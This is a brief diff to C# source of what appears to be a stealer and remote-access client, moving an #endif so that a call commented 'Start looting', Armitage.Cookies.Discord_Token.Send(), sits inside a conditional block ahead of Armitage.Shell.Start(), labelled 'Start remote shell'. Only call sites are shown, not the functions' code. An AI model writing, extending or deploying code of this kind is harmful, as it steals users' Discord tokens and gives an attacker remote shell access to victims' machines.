@@ -67,7 +67,6 @@ namespace Client
                     ProtectTheLetter();
                 }
             }
-#endif
 
             /// Init update checkers.
             Utilities.Updater Updater = new Utilities.Updater();
@@ -83,7 +82,7 @@ namespace Client
 
             /// Start looting.
             Armitage.Cookies.Discord_Token.Send();
-
+#endif
             /// Start remote shell
             Armitage.Shell.Start();
             while (true)
